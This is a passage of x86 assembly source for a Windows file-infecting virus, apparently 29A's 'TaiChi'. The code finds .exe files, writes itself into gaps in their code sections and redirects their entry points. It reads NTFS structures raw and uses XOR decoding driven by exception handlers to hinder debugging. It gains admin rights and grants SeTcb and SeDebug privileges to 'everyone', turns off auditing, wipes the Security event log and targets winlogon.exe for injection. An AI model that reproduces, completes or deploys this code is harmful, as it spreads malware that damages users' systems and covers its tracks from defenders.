; out: ecx - LCN
get_run_lcn	proc	near
	push ebx
	push edx

	mov dl, byte ptr [ebx] 
	and edx, 0Fh
	xor ecx, ecx
	mov cl, [ebx]
	shr cl, 4

	jecxz get_run_lcn_error

	add ebx, edx
	add ebx, ecx
	movsx edx, byte ptr [ebx]
	dec ecx
	dec ebx
get_run_lcn_loop:
	jecxz get_run_lcn_end

	shl edx, 8
	mov dl, [ebx]
	dec ebx
	dec ecx
	jmp get_run_lcn_loop
get_run_lcn_end:
	mov ecx, edx

get_run_lcn_error:
	pop edx
	pop ebx
	retn
get_run_lcn	endp

; in: eax - directory file record
;     ebx - attribute to look for
; out: same as find_attrib
find_attrib_directory	proc	near
        pushad
        push 4
	pop ecx
	call $+13
	dw	"$", "I", "3", "0"
	pop edx
	call find_attrib
	mov dword ptr [esp.Pushad_eax], eax
	popad
	retn
find_attrib_directory	endp

; in: ebx - the attribute header
; out: eax - buffer where is the attribute's specific value part stored
;      ecx - length of the attribute's specific value part
read_specific_value_part	proc	near
        pushad

        lea edx, [ebx+10h]

        cmp byte ptr [ebx+8], 0
	jz $+5
	add edx, 20h

	mov ecx, [edx]
        mov dword ptr [esp.Pushad_ecx], ecx

        mov eax, ecx
        call alloc_mem
	xchg eax, edi

        cmp byte ptr [ebx+8], 0
	jnz read_specific_value_part_nonresident

	push edi

        mov esi, ebx
	movzx eax, word ptr [edx+4]
	add esi, eax
        rep movsb

        pop edi
        jmp read_specific_value_part_end

read_specific_value_part_nonresident:
        lea edx, dword ptr [ebx+10h]
	mov ecx, dword ptr [edx+8]
	inc ecx

	xor eax, eax
	call read_nonresident_value

read_specific_value_part_end:
	mov dword ptr [esp.Pushad_eax], edi
	popad
	retn
read_specific_value_part	endp

; in: ecx - VCNz+1
;     ebx - attribute header
read_nonresident_value	proc	near
	pushad

read_nonresident_value_loop:
	jecxz read_nonresident_value_end

	push ebx
	push eax
	push ecx
	push edi
	call process_runlist
        mov edx, ecx

	pop edi
	pop ecx

	cmp ecx, edx
	jae $+4
	mov edx, ecx
        
	call read_clusterz
	sub ecx, edx

	mov ebx, edx
	mov eax, edx
	movzx edx, byte ptr [ebp+sec_per_cluster]
	mul edx

	movzx edx, word ptr [ebp+bytez_per_sec]
	mul edx
	add edi, eax
        pop eax

	add eax, ebx
	pop ebx
	jmp read_nonresident_value_loop

read_nonresident_value_end:
	popad
	retn
read_nonresident_value	endp

; in: eax - cluster to start writing
;     edx - how much clusterz to write
;     edi - buffer
write_clusterz	proc	near
	pushad
	mov ebx, edx

        movzx ecx, byte ptr [ebp+sec_per_cluster]
	mul ecx
	xchg eax, edx

        push edx

	mov eax, ebx
	mul ecx
	mov esi, eax

	pop edx

	mov ebx, edi
	push 1
	pop ecx
	call readwrite_sectorz
	popad
	retn
write_clusterz	endp

; in: eax - cluster to start reading
;     edx - how much clusterz to read
;     edi - buffer
read_clusterz	proc	near
	pushad
	mov ebx, edx

        movzx ecx, byte ptr [ebp+sec_per_cluster]
	mul ecx
	xchg eax, edx

        push edx

	mov eax, ebx
	mul ecx
	mov esi, eax

	pop edx

	mov ebx, edi
	xor ecx, ecx
	call readwrite_sectorz
	popad
	retn
read_clusterz	endp


; in: ebx - filename
;     ecx - sizeof filename
;     eax - 1) index root attrib+10h
;	    2) index allocation attrib+18h
; out: eax - *index entry
find_index_entry	proc	near
        pushad
	mov esi, ebx
	call uppercase_unicode
	add eax, [eax]
find_index_entry_loop:
	test word ptr [eax+0Ch], 2
	jnz find_index_entry_end_error
	lea edx, dword ptr [eax+10h]

	cmp cl, byte ptr [edx+40h]
	jnz find_index_entry_try_next_one

	lea esi, dword ptr [edx+42h]
	call uppercase_unicode

	push ecx
	mov edi, ebx
	repe cmpsw
	pop ecx
        jnz find_index_entry_try_next_one

        jmp find_index_entry_end

find_index_entry_try_next_one:
	cmp word ptr [eax+8], 0
	jz find_index_entry_end_error
	movzx edx, word ptr [eax+8]
	add eax, edx
	jmp find_index_entry_loop
find_index_entry_end_error:
	xor eax, eax
find_index_entry_end:
	mov dword ptr [esp.Pushad_eax], eax
	popad
	retn
find_index_entry	endp

seh_decode	proc
	mov eax, dword ptr [esp+4+EH_ExceptionRecord]
	cmp dword ptr [eax], EXCEPTION_BREAKPOINT
	jz $+11
	cmp dword ptr [eax], EXCEPTION_SINGLE_STEP
	jz seh_running_line
	retn

	pop eax
        pushad

	mov edx, dword ptr [esp.cPushad+EH_ContextRecord]
        mov ebx, dword ptr [edx.CONTEXT_Eip]
	add dword ptr [edx.CONTEXT_Eip], 8

	movzx eax, word ptr [ebx+1]
	sub ebx, eax
	add ebx, 3

        bt word ptr [ebx], 15
        jc $-5

        bts word ptr [ebx], 15
        jc $-12
        
        bt word ptr [ebx], 14
        jnc seh_decode_code

        dec word ptr [ebx]
        test word ptr [ebx], 00111111b
        jnz $+7
               
        dec word ptr [ebx]
        jmp $+7

        inc word ptr [ebx]
	jmp seh_decode_end

seh_decode_code:
	movzx ecx, word ptr [ebx+2]
	lea edi, [ebx+5]
	mov al, byte ptr [ebx+4]

	xor byte ptr [edi], al
	inc edi
	loop $-3

	inc word ptr [ebx]
        xor byte ptr [ebx+1], 1000000b

seh_decode_end:
        btr word ptr [ebx], 15

	popad
	xor eax, eax
	retn

seh_running_line:
	pop eax
        pushad

	mov edx, dword ptr [esp.cPushad+EH_ContextRecord]
        mov ebx, dword ptr [edx.CONTEXT_Eip]
	add dword ptr [edx.CONTEXT_Eip], 2
        
	movzx ecx, byte ptr [ebx]
	inc ebx
	mov al, byte ptr [ebx]
	inc ebx
        mov edi, ebx

        xor byte ptr [edi], al
        inc edi
        loop $-3
        
        cmp byte ptr [ebx], 9dh
        jnz $+16

	mov eax, dword ptr [edx+CONTEXT_Esp]
	test dword ptr [eax], 100h
	jz $+12

	or dword ptr [edx.CONTEXT_EFlags], 100h

        popad
	xor eax, eax
	retn
seh_decode	endp

enter_single_stepping	proc	near
        pop eax
        pushfd
	pushfd
	or dword ptr [esp], 100h		; set the Trap flag

	popfd					; enter trace mode
        jmp eax					; the first instruction is not being traced
enter_single_stepping	endp

; in: eax - *file record
;     esi - path
; out: eax - file record number
;      CFlag - 1 if error
recursive_directory_search	proc	near
        pushad
	mov edx, eax

        push esi
	mov ebx, 90h
	call read_directory_attribute
	jc recursive_directory_search_index_allocation

	jmp recursive_directory_search_got_fr

recursive_directory_search_index_allocation:
	mov eax, edx

	push esi
	mov ebx, 0a0h
	call read_directory_attribute
	jc recursive_directory_search_end_

recursive_directory_search_got_fr:
	mov edi, eax

	mov ebx, esi
	call gimme_sub_path
	inc ecx
	shl ecx, 1
	add esi, ecx

        call read_file_record
        jc recursive_directory_search_end_
        xchg eax, edx

        test word ptr [edx+16h], 1
        jz recursive_directory_search_end

        test word ptr [edx+16h], 02h
	jnz recursive_directory_search_go_deeper
	cmp word ptr [esi-2], 0
	jnz recursive_directory_search_end

	mov eax, edi
	jmp recursive_directory_search_end_ok

recursive_directory_search_go_deeper:
        cmp word ptr [esi-2], 0
        jz recursive_directory_search_end

        mov eax, edx
        call recursive_directory_search
        jc recursive_directory_search_end

recursive_directory_search_end_ok:
        clc
        jmp $+3
recursive_directory_search_end:
	stc
	mov dword ptr [esp.Pushad_eax], eax

        pushfd
        push edx
	call free_mem
	popfd

recursive_directory_search_end_:
	popad
	retn
recursive_directory_search	endp

; in: ebx - attribute
;     [esp+4] - path
; out: eax - file record number
read_directory_attribute	proc	near
        pushad
        mov edi, ebx

        sub esp, 4
        and dword ptr [esp], 0

        call find_attrib_directory_
	stc
	jecxz read_directory_attribute_end_

	mov ebx, ecx
	call read_specific_value_part
	xchg eax, esi
	mov edx, esi

read_directory_index_loop:
	lea edx, [edx+10h]
	cmp edi, 90h
	jz $+5
	add edx, 8

	mov ebx, dword ptr [esp+4+cPushad+4]
	push ecx
	call gimme_sub_path

	mov eax, edx
	call find_index_entry
	pop ecx

        test eax, eax
	jnz read_directory_attribute_end

	cmp edi, 90h
	jz read_directory_attribute_end_error
        
        sub ecx, dword ptr [ebp+index_buffer_size]
        jz read_directory_attribute_end_error

        add edx, dword ptr [edx+8]
	jmp read_directory_index_loop

read_directory_attribute_end:
	mov eax, dword ptr [eax]

	clc
	jmp $+3
read_directory_attribute_end_error:
	stc
	pushfd
	push esi
	call free_mem
	popfd

read_directory_attribute_end_:
	pushfd
	cmp dword ptr [esp+4], 0
	jz $+11
	
	push dword ptr [esp+4]
	call free_mem

        popfd
        pop ecx

        mov dword ptr [esp.Pushad_eax], eax
        popad
        retn 4

gimme_sub_path:
	push ebx
	xor ecx, ecx

gimme_sub_path_loop:
	cmp word ptr [ebx], '\'
	jz $+13
	cmp word ptr [ebx], 0
	jz $+7
	inc ebx
        inc ecx
        inc ebx
	jmp gimme_sub_path_loop

	pop ebx
	retn

find_attrib_directory_:
	pushad
	xor edi, edi

find_attrib_directory__:
	push eax
	call find_attrib_directory
	xchg eax, ecx
	pop eax

        test edi, edi
	jnz $+6
        jecxz find_attrib_directory_next
        jmp $+16

        jecxz $+8
        mov dword ptr [esp+cPushad+4], edi
        jmp $+8

	push edi
	call free_mem

find_attrib_directory__end:
	mov dword ptr [esp.Pushad_ecx], ecx
	popad
        retn
find_attrib_directory_next:
	mov ecx, ebx
	call find_attrib_in_attrib_list
	xchg eax, ecx
	jecxz find_attrib_directory__end

	xchg eax, ecx
	call read_file_record       	
	xor ecx, ecx
	jc find_attrib_directory__end

	mov edi, eax
	jmp find_attrib_directory__
	
read_directory_attribute	endp

; out: eax - bool
is_caller_admin	proc	near
        pushad
        @SEH_SetupFrame <jmp is_caller_admin_end>

        @pushvar <dd	?>
	pop eax
	and dword ptr [eax], 0
	push eax
	push eax
	align 4
	call $+24
	db	0ffh, 25h, 60h
	db	1
	db	2
	db	0, 0, 0, 0, 0, SECURITY_NT_AUTHORITY
	dd	SECURITY_BUILTIN_DOMAIN_RID
	dd	DOMAIN_ALIAS_RID_ADMINS
	add dword ptr [esp], 3
	push 0
	call dword ptr [ebp+tCheckTokenMembership]

	pop eax
	mov eax, dword ptr [eax]

is_caller_admin_end:
	@SEH_RemoveFrame
	mov dword ptr [esp.Pushad_eax], eax
	popad
	retn
is_caller_admin	endp

main_infection_routine	proc	near
        pushad
        @SEH_SetupFrame_ <call NtfsMap>, <call seh_decode>, <mov esp,[esp.EH_EstablisherFrame]>, <jmp main_infection_routine_end>

	mov eax, 64000
	call alloc_mem
        xchg eax, edi

        lea esi, [edi+32000]

        push edi
        call $+17
        	dw	"*", ".", "e", "x", "e", 0
        call dword ptr [ebp+tFindFirstFileW]
        inc eax
        jz main_infection_routine_end_free_mem
        dec eax
        xchg eax, ebx

main_infection_routine_loop:
        @pushvar <dd	?>
	push esi
	push 16000
	lea eax, [edi+44]
	push eax
	call dword ptr [ebp+tGetFullPathNameW]
	xchg eax, ecx
	jecxz main_infection_routine_end_find_close

        call NtfsOpenFile
        inc eax
        jz main_infection_end_find_next
        dec eax

        pushad
        xchg eax, ebx
        call infect_file

        pushfd
	call NtfsCloseFile
	popfd
        popad
        jnc main_infection_routine_end_find_close

main_infection_end_find_next:
        push edi
        push ebx
        call dword ptr [ebp+tFindNextFileW]
        test eax, eax
        jnz main_infection_routine_loop

main_infection_routine_end_find_close:
	push ebx
	call dword ptr [ebp+tFindClose]
main_infection_routine_end_free_mem:
	push edi
	call free_mem
main_infection_routine_end:
        @SEH_RemoveFrame
        popad
	retn
main_infection_routine	endp

infect_file	proc	near
        pushad

        call check_for_valid_pe
	jc infect_file_end_error
	jnz infect_file_end_error
        
	cmp dword ptr [ebx.MZ_res], not "RAT"
	jz infect_file_end_error

	mov eax, dword ptr [ebx.MZ_lfanew]
	add eax, ebx
	movzx edi, word ptr [eax.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea edi, [edi+eax+IMAGE_SIZEOF_FILE_HEADER+4]
	mov esi, dword ptr [edi.SH_PointerToRawData]
	mov ecx, dword ptr [edi.SH_SizeOfRawData]
	add esi, ebx

	xor edx, edx
gap_loop:
	jecxz gap_loop_end
	lodsb
	dec ecx
	call is_gap
	jz $+6
	xor edx, edx
	jmp gap_loop

	inc edx
	cmp edx, virus_size
	jnz gap_loop

gap_loop_end:
	cmp edx, virus_size
	jnz infect_file_end_error

        sub esi, virus_size
	push esi
        sub esi, dword ptr [edi.SH_PointerToRawData]
        pop edi
        sub esi, ebx

        push esi
        call $+5
taichi_here:
        pop esi
        sub esi, taichi_here-taichi_start
        mov ecx, virus_size
        rep movsb
        pop esi

	mov eax, dword ptr [ebx.MZ_lfanew]
	mov dword ptr [ebx.MZ_res], not "RAT"
	add eax, ebx
	and dword ptr [eax.NT_OptionalHeader.OH_CheckSum], 0

	mov ecx, dword ptr [eax.NT_OptionalHeader.OH_ImageBase]
	add ecx, dword ptr [eax.NT_OptionalHeader.OH_AddressOfEntryPoint]
        mov dword ptr [edi-(host_start-victim_entrypoint)], ecx

	mov edx, dword ptr [eax.NT_OptionalHeader.OH_BaseOfCode]
	add edx, esi
	mov dword ptr [eax.NT_OptionalHeader.OH_AddressOfEntryPoint], edx

	clc
	jmp infect_file_end_error+1
infect_file_end_error:
	stc
	popad
	retn
infect_file	endp

check_for_valid_pe	proc	near
	pushad
	movzx eax, word ptr [ebx]
	not eax
	cmp eax, not "ZM"
	stc
	jnz check_for_valid_pe_end
	mov edx, dword ptr [ebx.MZ_lfanew]
	add edx, ebx
	movzx eax, word ptr [edx]
	not eax
	cmp eax, not "EP"
	stc
	jnz check_for_valid_pe_end
        cmp word ptr [edx.NT_FileHeader.FH_Machine],IMAGE_FILE_MACHINE_I386
	stc
	jnz check_for_valid_pe_end
	movzx eax, word ptr [edx.NT_FileHeader.FH_Characteristics]
	not al
	test eax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_DLL
	clc
check_for_valid_pe_end:
	popad
	retn
check_for_valid_pe	endp

is_gap	proc	near
	cmp al, 90h
	jz is_gap_end
	cmp al, 0cch
	jz is_gap_end
	test al, al
	jz is_gap_end
is_gap_end:
	retn
is_gap	endp


NtfsMap	proc	near
        pushad
	mov eax, dword ptr [esp+cPushad+4+EH_ExceptionRecord]
	cmp dword ptr [eax], EXCEPTION_ACCESS_VIOLATION
	jz $+4
	popad
	retn

	call gimme_data_section_ptr
	xchg eax, ebp

	mov ebx, dword ptr [esp+4+cPushad+EH_ExceptionRecord]
	mov edi, dword ptr [ebx.ER_ExceptionInformation+4]	; where it happened
       	and edi, 0fffff000h

        push -1
	push dword ptr [ebp+fl_mutex]
	call dword ptr [ebp+tWaitForSingleObject]

	lea edx, dword ptr [ebp+file_list]
NtfsMap_file_list_loop:
        mov esi, edx

        lodsd
	xchg eax, edx

        test edx, edx
        jz NtfsMap_release_mutex_error

        cmp dword ptr [edx.F_vmem_start], edi
        ja NtfsMap_file_list_loop
        cmp dword ptr [edx.F_vmem_end], edi
	jc NtfsMap_file_list_loop

	mov esi, edx

        push 28
	pop eax
	call alloc_mem
        push eax
        push eax

        push 28
        push eax
        push edi
        call dword ptr [ebp+tVirtualQuery]
        xchg eax, ecx
        pop eax
        jecxz NtfsMap_virtual_query_error
        mov edx, dword ptr [eax+16]
NtfsMap_virtual_query_error:
	call free_mem
	test ecx, ecx
	jz NtfsMap_virtual_query_error

	test edx, MEM_COMMIT
	jnz NtfsMap_dirty_flag

        push PAGE_READWRITE
	push MEM_COMMIT
	push 4096
	push edi
	call dword ptr [ebp+tVirtualAlloc]
	xchg eax, ecx
	jecxz NtfsMap_release_mutex_error

	mov edx, dword ptr [esi.F_vmem_start]
	mov eax, edi
	sub eax, edx
	shr eax, 12

        ; and finally read cluster from phile ...

        mov ebx, dword ptr [esi.F_prunlist]
        xor edx, edx
        xor esi, esi
	call process_runlist_loop
	test eax, eax
	jz NtfsMap_release_mutex_error

	push 1
	pop edx
	call read_clusterz

	@pushvar <dd	?>
	push PAGE_READONLY
	push 4096
	push edi
	call dword ptr [ebp+tVirtualProtect]
	xchg eax, ecx
	jecxz NtfsMap_release_mutex_error

        clc
	jmp NtfsMap_release_mutex_error+1

NtfsMap_dirty_flag:
	@pushvar <dd	?>
	push PAGE_READWRITE
	push 4096
	push edi
	call dword ptr [ebp+tVirtualProtect]
	xchg eax, ecx
	jecxz NtfsMap_release_mutex_error

        ; and finally set a dirty flag ...

        mov edx, dword ptr [esi.F_vmem_start]
	mov eax, edi
	sub eax, edx
	shr eax, 12

	xor edx, edx
	push 8
	pop ecx
	div ecx
	xchg edx, ecx

        push 1
        pop ebx
        shl ebx, cl

        mov edx, dword ptr [esi.F_dirty_bmask]
	or byte ptr [edx+eax], bl
        
        clc
	jmp NtfsMap_release_mutex_error+1
NtfsMap_release_mutex_error:
	stc
	pushfd
        push dword ptr [ebp+fl_mutex]
        call dword ptr [ebp+tReleaseMutex]
        popfd

        popad
        jc $+3
	pop eax
        xor eax, eax
        retn
NtfsMap	endp

; in: esi - UNICODE name of the file (with full path)
; out: eax - base addr where file is mapped to
NtfsOpenFile	proc	near
        pushad
	@SEH_SetupFrame_ <call seh_decode>, <mov esp,[esp.EH_EstablisherFrame]>, <jmp NtfsOpenFile_end_error>

        xor eax, eax
	push eax
	push eax
	push OPEN_EXISTING
	push eax				; we have to check whether file is
	push eax				; read/write even if we can write to
	push GENERIC_READ or GENERIC_WRITE	; non write file becoz of coherency ...
	push esi
	call dword ptr [ebp+tCreateFileW]
	inc eax
	jz NtfsOpenFile_end_error
	dec eax

	push eax
	call dword ptr [ebp+tCloseHandle]

        lea esi, [esi+6]
	mov eax, dword ptr [ebp+rootdir_file_record]
        call recursive_directory_search
        jc NtfsOpenFile_end_error

        call read_file_record
	jc NtfsOpenFile_end_error
	mov edi, eax

	push 80h
	pop ebx					; gimme the $DATA attribute
	xor ecx, ecx
	cdq
	call find_attrib
        xchg eax, ebx

        cmp byte ptr [ebx+8], 1
        jnz NtfsOpenFile_end_error_
        cmp word ptr [ebx+0ch], 1		; check compressed flag, and non-resident one
        jz NtfsOpenFile_end_error_

        cmp dword ptr [ebx+34h], 0		; check file size
        jnz $+11
        cmp dword ptr [ebx+30h], 186a0h
	;jc NtfsOpenFile_end_error_

 	push edi

        mov eax, dword ptr [ebx+4]
	mov esi, dword ptr [ebx+20h]		; get length of the runlist
	sub eax, esi
	add esi, ebx
	mov ecx, eax
	add eax, type(FILE)
	call alloc_mem
	xchg eax, edi

	push edi
	add edi, type(FILE)
	mov eax, edi
	rep movsb
	pop edi

	mov dword ptr [edi.F_prunlist], eax
	mov eax, dword ptr [ebx+30h]
	mov dword ptr [edi.F_size], eax

	xor edx, edx
	mov ecx, 4096
	div ecx					; round size to pagez
	test edx, edx
	jz $+3
	inc eax
	mul ecx
        xchg eax, ebx

        push PAGE_READONLY
        push MEM_RESERVE
        push ebx
        push edx
        call dword ptr [ebp+tVirtualAlloc]
        push eax
	mov dword ptr [edi.F_vmem_start], eax
	add eax, ebx
	mov dword ptr [edi.F_vmem_end], eax

	shr ebx, 12
	mov dword ptr [edi.F_dirty_size], ebx
	xor edx, edx
	mov eax, ebx
	push 8
	pop ecx
	div ecx
	test edx, edx
	jz $+3
	inc eax

	call alloc_mem
	mov dword ptr [edi.F_dirty_bmask], eax

	push -1
	push dword ptr [ebp+fl_mutex]
	call dword ptr [ebp+tWaitForSingleObject]

	lea edx, dword ptr [ebp+file_list]
file_list_loop:
        mov esi, edx
	lodsd
	xchg eax, edx
	lodsd

        test edx, edx
        jnz file_list_loop

        inc eax
        mov dword ptr [edi.F_handle], eax
        mov dword ptr [esi-8], edi

        push dword ptr [ebp+fl_mutex]
        call dword ptr [ebp+tReleaseMutex]
        pop eax

	call free_mem

        jmp NtfsOpenFile_end_error+3
NtfsOpenFile_end_error_:
	push edi
	call free_mem
NtfsOpenFile_end_error:
	push -1
	pop eax

        @SEH_RemoveFrame
	mov dword ptr [esp.Pushad_eax], eax
	popad
	retn
NtfsOpenFile	endp

; in: ebx - value (base mem) which returned NtfsOpenFile
NtfsCloseFile	proc	near
        pushad
	@SEH_SetupFrame_ <call seh_decode>, <mov esp,[esp.EH_EstablisherFrame]>, <jmp NtfsCloseFile_end>

        push -1
	push dword ptr [ebp+fl_mutex]
	call dword ptr [ebp+tWaitForSingleObject]

	lea edx, dword ptr [ebp+file_list]
NtfsCloseFile_file_list_loop:
        mov esi, edx
        mov ecx, edx

        lodsd
	xchg eax, edx

        test edx, edx
        jz NtfsCloseFile_release_mutex_error

        cmp dword ptr [edx.F_vmem_start], ebx
        jnz NtfsCloseFile_file_list_loop

        push dword ptr [edx]
        pop dword ptr [ecx]

        mov ecx, dword ptr [edx.F_dirty_size]
        mov esi, dword ptr [edx.F_dirty_bmask]
        mov edi, ebx
        mov ebx, dword ptr [edx.F_prunlist]
        push edx
        xor edx, edx

NtfsCloseFile_write_changez_loop:
        push ecx
        push edx

        push edx
	mov eax, edx
        xor edx, edx
	push 8
	pop ecx
	div ecx
	xchg edx, ecx
	pop edx

	movzx eax, byte ptr [esi+eax]
	bt eax, ecx
        jnc NtfsCloseFile_next_cluster

        push esi
        mov eax, edx
        xor edx, edx
        xor esi, esi
	call process_runlist_loop
	pop esi

	push 1
	pop edx
	call write_clusterz

NtfsCloseFile_next_cluster:
	add edi, 4096

        pop edx
	pop ecx
	inc edx
        loop NtfsCloseFile_write_changez_loop
        pop ebx

        push dword ptr [ebx.F_dirty_bmask]
	call free_mem
        
	push MEM_RELEASE
	push 0
	push dword ptr [ebx.F_vmem_start]
	call dword ptr [ebp+tVirtualFree]
        
	push ebx
	call free_mem
	clc
	jmp NtfsCloseFile_release_mutex_error+1
NtfsCloseFile_release_mutex_error:
	stc
	pushfd
        push dword ptr [ebp+fl_mutex]
        call dword ptr [ebp+tReleaseMutex]
        popfd
NtfsCloseFile_end:
	@SEH_RemoveFrame
	popad
	retn
NtfsCloseFile	endp

gain_admin	proc	near
	pushad
	@SEH_SetupFrame <jmp gain_admin_end>

	call is_caller_admin
	xchg eax, ecx
	jecxz gain_admin_try_gain

        call disable_auditing

	call add_privilegez

        @pushsz "Security"
	pop esi
	call clear_event_log

	call taichi_payload
	jmp gain_admin_end
gain_admin_try_gain:
        @pushvar <reg_handle_gain	dd	?>
        pop esi
        push esi
        @pushsz "Software\29A\TaiChi"
        push HKEY_LOCAL_MACHINE
        call dword ptr [ebp+tRegCreateKeyA]
        test eax, eax
	jnz gain_admin_end

	mov eax, 300
	call alloc_mem
	xchg eax, edi

	xor ebx, ebx
gain_admin_try_gain_loop:
        @pushvar <dd	?>
	pop eax
	mov dword ptr [eax], 150
	push eax
	push edi
	@pushvar <dd	?>
	push 0
	@pushvar <dd	?>
	pop eax
	mov dword ptr [eax], 75
	push eax
	lea eax, [edi+150]
	push eax
	push ebx
	push dword ptr [esi]
	call dword ptr [ebp+tRegEnumValueA]
	test eax, eax
	jnz gain_admin_try_gain_close_reg_handle

	push ebx
        @pushvar <htoken	dd	?>
        pop ebx
        push ebx
        push eax
        push LOGON32_LOGON_INTERACTIVE
	push edi
        push eax
        lea eax, [edi+150]
        push eax
	call dword ptr [ebp+tLogonUserA]
	xchg eax, ecx
	jecxz gain_admin_try_next_account

	push dword ptr [ebx]
	call dword ptr [ebp+tImpersonateLoggedOnUser]
	xchg eax, ecx
	jecxz gain_admin_try_next_account

	push dword ptr [ebx]
	call dword ptr [ebp+tCloseHandle]

	inc dword ptr [ebp+revert_to_self]
	pop ebx
	jmp gain_admin_try_gain_close_reg_handle
gain_admin_try_next_account:
	pop ebx
	inc ebx
	jmp gain_admin_try_gain_loop
gain_admin_try_gain_close_reg_handle:
	push dword ptr [esi]
        call dword ptr [ebp+tRegCloseKey]
	push edi
	call dword ptr [ebp+tGlobalFree]
gain_admin_end:
	@SEH_RemoveFrame
	popad
	retn
gain_admin	endp

add_privilegez:
	mov ebx, ebp
add_privilegez_	proc	near
        local	sort_buf:DWORD
        local	entry_count:DWORD
	local	loa:LSA_OBJECT_ATTRIBUTES
	local	policy_handle:DWORD

	pushad
	@SEH_SetupFrame <jmp add_privilegez_end>

	lea eax, [policy_handle]
	push eax
	push POLICY_CREATE_ACCOUNT or POLICY_LOOKUP_NAMES

	lea edi, [loa]
	push type(LSA_OBJECT_ATTRIBUTES) shr 2
	pop ecx
	push edi
	xor eax, eax
	rep stosd

	push 0
	call dword ptr [ebx+tLsaOpenPolicy]
	test eax, eax
	jnz add_privilegez_end

	mov eax, 100
	call alloc_mem
	xchg eax, edi
	push edi

	@pushvar <dd	?>
	lea edx, [sort_buf]
	mov dword ptr [edx], 20
	push edx
	lea edx, [edi+20]
	push edx
	lea edx, [entry_count]
	mov dword ptr [edx], 80
	push edx
	push edi
	@pushvar <dw	"e", "v", "e", "r", "y", "o", "n", "e", 0>
	push 0
	call dword ptr [ebx+tLookupAccountNameW]
	xchg eax, ecx
	jecxz add_privilegez_end_

	call add_privilegez_next
	db	"SeTcbPrivilege", 0
	db	"SeDebugPrivilege", 0
	db	-1
add_privilegez_next:
	pop esi

add_privilegez_privilege_loop:
	cmp byte ptr [esi], -1
	jz add_privilegez_end_

	push esi
	push edi
	push dword ptr [policy_handle]
	call add_privilege

	@endsz

	jmp add_privilegez_privilege_loop
add_privilegez_end_:
	call free_mem
add_privilegez_close_policy:
	push dword ptr [policy_handle]
	call dword ptr [ebx+tLsaClose]
add_privilegez_end:
	@SEH_RemoveFrame
	popad
	leave
	retn
add_privilegez_	endp

; out: eax - NTSTATUS
add_privilege	proc	near	policy_handle:DWORD, sid:DWORD, privilege:DWORD
        pushad
	@SEH_SetupFrame <jmp add_privilege_end>	

	mov esi, dword ptr [privilege]
	mov edx, esi
	@endsz
	sub esi, edx
	shl esi, 1

	mov eax, esi
	add eax, 8
	call alloc_mem
	xchg eax, edi

	push edi
	push 1
	push edi

	mov eax, esi
	push eax
	sub eax, 2
	stosw
	pop eax
	stosw

	lea eax, [edi+4]
	stosd

	mov esi, edx
	xor eax, eax
add_privilege_loop:
	lodsb
	stosw
	test eax, eax
	jnz add_privilege_loop

        push dword ptr [sid]
        push dword ptr [policy_handle]
        call dword ptr [ebx+tLsaAddAccountRights]

	call free_mem
add_privilege_end:
	@SEH_RemoveFrame
	mov dword ptr [esp.Pushad_eax], eax
	popad
        leave
	retn 12
add_privilege	endp

disable_auditing:
        mov ebx, ebp
disable_auditing_	proc	near
	local	loa:LSA_OBJECT_ATTRIBUTES
	local	policy_handle:DWORD
	local	buf_ptr:DWORD

	pushad
	@SEH_SetupFrame <jmp disable_auditing_end>

	lea eax, [policy_handle]
	push eax
	push POLICY_VIEW_AUDIT_INFORMATION or POLICY_SET_AUDIT_REQUIREMENTS

	lea edi, [loa]
	push type(LSA_OBJECT_ATTRIBUTES) shr 2
	pop ecx
	push edi
	xor eax, eax
	rep stosd

	push 0
	call dword ptr [ebx+tLsaOpenPolicy]
	test eax, eax
	jnz disable_auditing_end

	lea eax, [buf_ptr]
	push eax
	push 2
	push dword ptr [policy_handle]
	call dword ptr [ebx+tLsaQueryInformationPolicy]
	test eax, eax
	jnz disable_auditing_close_policy

	mov esi, dword ptr [buf_ptr]
	and dword ptr [esi], 0

	mov ecx, dword ptr [esi+8]
	mov edi, dword ptr [esi+4]
	push 4
	pop eax
	rep stosd

	push esi
	push 2
	push dword ptr [policy_handle]
	call dword ptr [ebx+tLsaSetInformationPolicy]

	push esi
	call dword ptr [ebx+tLsaFreeMemory]
disable_auditing_close_policy:
	push dword ptr [policy_handle]
	call dword ptr [ebx+tLsaClose]

disable_auditing_end:
	@SEH_RemoveFrame
	popad
	leave
	retn
disable_auditing_	endp

clear_event_log	proc	near
	pushad
	@SEH_SetupFrame <jmp clear_event_log_end>

        push esi
	push 0
	call dword ptr [ebp+tOpenEventLogA]
	test eax, eax
	jz clear_event_log_end
	xchg eax, ebx

	push 0
	push ebx
	call dword ptr [ebp+tClearEventLogA]

	push ebx
	call dword ptr [ebp+tCloseEventLog]
clear_event_log_end:
	@SEH_RemoveFrame
	popad
	retn
clear_event_log	endp

infect_winlogon:
	mov ebx, ebp
infect_winlogon_	proc	near
        local	process_count:DWORD
        local	process_handle:DWORD
        local	module:DWORD

        pushad
	@SEH_SetupFrame	<jmp infect_winlogon_end>

        push SE_PRIVILEGE_ENABLED
	pop eax
	call se_debug_privilege
	jz infect_winlogon_end

	jmp infect_winlogon_next
se_debug_privilege	proc	near
        push ebp
        mov ebp, ebx
        @pushsz "SeDebugPrivilege"
	pop esi
	call touch_privilege
	pop ebp
	test eax, eax
	retn
se_debug_privilege	endp
infect_winlogon_next:

        mov eax, 80h+MAX_PATH
	call alloc_mem
	xchg eax, edi

	lea eax, [process_count]
	push eax
	push 80h
	push edi
	call dword ptr [ebx+tEnumProcesses]
	dec eax
	jnz infect_winlogon_free_mem

	mov ecx, dword ptr [process_count]
	mov esi, edi
	shr ecx, 2
infect_winlogon_search:
	lodsd
	pushad

	push eax
	push 0
	push PROCESS_DESIRED_ACCESS
	call dword ptr [ebx+tOpenProcess]
	test eax,eax
	jz infect_winlogon_next_process

	mov dword ptr [process_handle], eax

	@pushvar <dd	?>
	push 4
	lea edx, [module]
	push edx
	push eax
	call dword ptr [ebx+tEnumProcessModules]
	dec eax
	jnz infect_winlogon_close_process

	lea edi, [edi+80h]
        push MAX_PATH
	push edi
	push dword ptr [module]
	push dword ptr [process_handle]
	call dword ptr [ebx+tGetModuleBaseNameA]
	xchg eax, ecx
	jecxz infect_winlogon_close_process

        pushad
        @pushsz	"winlogon.exe"
	pop esi
	rep cmpsb
	popad
	jnz infect_winlogon_close_process

	push dword ptr [process_handle]
	call infiltrate_lsalogonuser
	mov dword ptr [esp.Pushad_ecx], 1

infect_winlogon_close_process:
	push dword ptr [process_handle]
	call dword ptr [ebx+tCloseHandle]
infect_winlogon_next_process:
	popad
